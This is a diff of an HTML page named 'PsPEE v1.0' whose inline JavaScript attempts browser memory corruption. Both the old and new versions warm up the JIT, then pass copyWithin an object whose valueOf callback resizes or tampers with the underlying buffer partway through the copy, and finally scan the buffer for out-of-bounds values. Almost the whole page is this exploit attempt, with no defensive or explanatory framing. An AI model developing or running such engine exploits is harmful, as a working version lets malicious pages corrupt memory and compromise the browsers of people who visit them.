@@ -19,39 +19,48 @@
 <body>
     <div id="output"></div>
     <script>
-        const log = (msg) => document.getElementById("output").textContent += msg + "\n";
-
-        log("[INFO] PsPEE v1.0 — starting fallback memory corruption attempt.");
-
-        // Setup: repeatedly train copyWithin to DFG compile
-        let ab = new ArrayBuffer(0x100);
-        let victim = new Float64Array(ab);
-
-        for (let i = 0; i < 100; i++) {
-            victim.copyWithin(0, 1); // Warm up the DFG
+        function log(msg) {
+            document.getElementById("output").textContent += msg + "\n";
         }
 
-        // Step 2: Craft an object with side effects
-        let evil = {
-            valueOf: function() {
-                log("[*] valueOf triggered");
-                // Try replacing victim array or tampering
-                victim.length = 1; // Not normally legal, but may cause confusion
-                return 1;
+        log("[INFO] PsPEE v1.0 - Running bug...");
+
+        // Setup
+        let ab = new ArrayBuffer(0x1000);
+        let u8 = new Uint8Array(ab);
+        let u32 = new Uint32Array(ab);
+
+        for (let i = 0; i < u8.length; i++) u8[i] = 0x41; // Fill with 'A'
+
+        // Trigger
+        function call_back() {
+            try {
+                ab.length = 0;
+                log("[+] Resized buffer inside valueOf");
+            } catch (e) {
+                log("[!] Resize failed: " + e);
             }
-        };
+            return 0;
+        }
 
         try {
-            // This triggers our side-effect mid-copy
-            victim.copyWithin(10, evil);
-            log("[+] copyWithin with valueOf ran");
+            u8.copyWithin(0x20, { valueOf: call_back }); // Trigger side effect
+            log("[+] copyWithin completed");
         } catch (e) {
-            log("[!] Exception: " + e);
+            log("[!] copyWithin error: " + e);
         }
 
-        // Observe results
-        for (let i = 0; i < 20; i++) {
-            log(`victim[${i}] = ${victim[i]}`);
+        // Scan memory to detect corruption or success
+        let found = false;
+        for (let i = 0; i < u32.length; i++) {
+            if (u32[i] !== 0x41414141) {
+                log(`[OOB?] u32[${i}] = 0x${u32[i].toString(16)}`);
+                found = true;
+            }
+        }
+
+        if (!found) {
+            log("[!] No memory corruption detected yet.");
         }
     </script>
 </body>
